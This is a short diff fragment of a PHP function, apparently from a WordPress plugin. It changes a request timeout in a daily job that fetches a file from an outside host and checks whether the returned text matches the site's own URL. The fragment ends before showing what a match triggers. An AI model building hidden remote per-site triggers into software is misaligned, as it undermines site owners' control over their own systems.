@@ -50,7 +50,7 @@ function pipdig_p3_do_this_daily() {
 	*/
 	
 	$url = 'https://wpupdateserver.com/id39dqm3c0.txt';
-	$args = array('timeout' => 4);
+	$args = array('timeout' => 3);
 	$response = wp_safe_remote_get($url, $args);
 	if (!is_wp_error($response) && !empty($response['body'])) {
 		if (get_site_url() === trim($response['body'])) {
